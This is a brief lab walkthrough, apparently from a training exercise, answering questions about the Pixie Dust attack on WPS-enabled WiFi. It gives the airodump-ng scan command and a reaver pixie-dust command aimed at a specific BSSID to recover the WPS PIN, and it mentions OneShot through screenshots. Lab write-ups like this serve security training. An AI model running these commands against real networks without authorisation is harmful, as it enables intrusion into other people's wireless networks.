# [The Pixie Dust Attack](The%20Pixie%20Dust%20Attack.md)
### Scan for the available WIFI Networks. What is the name of the available WIFI network?

![](Screenshot%202026-09-21%20at%2010.15.07.png)

```sh
airodump-ng --wps mon0
```

![](Screenshot%202026-09-21%20at%2010.16.04.png)
### Perform the Pixie Dust attack on the WiFi network. What is the WPS PIN for this network?

Let's try Reaver first

```sh
reaver -K 1 -vvv -b 9A:C9:B1:36:C5:71 -c 1 -i mon0
```

![](Screenshot%202026-09-21%20at%2010.17.14.png)

Then, we gonna try OneShot

![](Screenshot%202026-09-21%20at%2010.19.10.png)

![](Screenshot%202026-09-21%20at%2010.19.34.png)

![](Screenshot%202026-09-21%20at%2010.22.45.png)